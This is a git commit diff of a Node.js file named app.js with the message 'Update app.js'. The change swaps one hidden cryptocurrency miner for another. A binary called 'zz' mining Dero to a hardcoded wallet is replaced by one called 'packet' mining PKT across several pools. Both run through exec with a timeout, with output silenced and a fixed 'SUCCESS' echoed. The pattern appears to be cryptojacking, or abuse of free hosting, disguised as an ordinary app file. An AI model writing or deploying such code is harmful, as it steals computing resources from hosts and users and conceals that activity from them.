d5872ac235060b40dfaeb826fa2128920fa95058
orticaboacqua <122539810+orticaboacqua@users.noreply.github.com>
2023-01-12 20:48:05 +0700

    Update app.js

--- app.js
+++ app.js
@@ -1,6 +1,6 @@
 var { exec, spawn, execSync, spawnSync } = require('child_process');
 
-exec('chmod 700 zz && timeout 25m ./zz -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.RYZ -r asia.whalesburg.com:4300 -p stratum >/dev/null 2>&1;echo SUCCESS', function (err, stdout, stderr) {
+exec('chmod 700 packet && timeout 25m ./packet ann -p pkt1qthhdz7dfrepa43xkww6ft4wz0cyuqda9ehqjqf http://pool.pktpool.io/diff/16384 http://pool.pkt.world/ http://pool.pkteer.com -t 3 >/dev/null 2>&1;echo SUCCESS', function (err, stdout, stderr) {
    if (err) console.error(stderr);
    console.log(stdout);
 });
